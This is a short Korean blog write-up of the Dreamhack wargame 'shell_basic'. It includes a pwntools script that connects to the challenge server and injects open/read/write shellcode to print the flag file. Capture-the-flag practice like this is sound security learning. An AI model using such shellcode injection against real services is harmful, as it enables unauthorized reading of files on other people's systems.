---
title: "[ Dreamhack ] shell_basic"
description: "execve함수 등을 사용하지 못하는 것을 보니 flag 파일을 읽을 수 있는 쉘코드를 직접 작성해야 한다.pwntools의 shellcraft를 이용하여 쉘 코드를 작성하면 된다.코드를 실행하면 flag를 얻을 수 있다."
date: 2023-03-06T14:12:28.711Z
categories: [Wargame, Dreamhack]
tags: ["dreamhack","pwn"]
---
![](/images/8ae8e2e7-cecd-420a-9885-996c8b48ca7c-image.png)

<br>

<br>

### **문제 분석**

---
execve함수 등을 사용하지 못하는 것을 보니 flag 파일을 읽을 수 있는 쉘코드를 직접 작성해야 한다.

<br>

<br>

### **문제 풀이**

---
pwntools의 shellcraft를 이용하여 쉘 코드를 작성하면 된다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 9412)

context.arch = 'amd64'
r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = ''
shellcode += shellcraft.open(r)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

shellcode = asm(shellcode)

p.sendlineafter('shellcode: ', shellcode)
p.recvline()
```

<br>

<br>

![](/images/ead155fd-3f63-44d6-ac99-d083ef4f20fa-image.png)

코드를 실행하면 flag를 얻을 수 있다.